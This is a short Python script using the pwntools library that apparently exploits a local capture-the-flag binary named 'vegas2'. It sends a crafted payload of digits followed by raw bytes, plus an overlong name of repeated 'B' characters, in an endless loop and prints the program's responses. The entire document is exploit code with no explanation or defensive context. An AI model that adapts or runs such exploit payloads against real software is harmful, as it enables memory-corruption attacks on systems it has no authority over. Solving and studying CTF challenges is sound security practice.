from pwn import *
io = process('./vegas2')
exploit_string = "100020003000400050006000700080009000\x55\x55\x55\x55\xff\xff\xff\x7f"
winner_name = "B"
for i in range(1,100):
	winner_name += "B"
while(1):
	io.sendline(exploit_string)
	io.sendline(winner_name)
	x1 = io.recvline()
	x2 = io.recvline()
	x3 = io.recvline()
	x4 = io.recvline()
	x5 = io.recvline()
	print(x1 + x2 + x3 + x4 + x5)
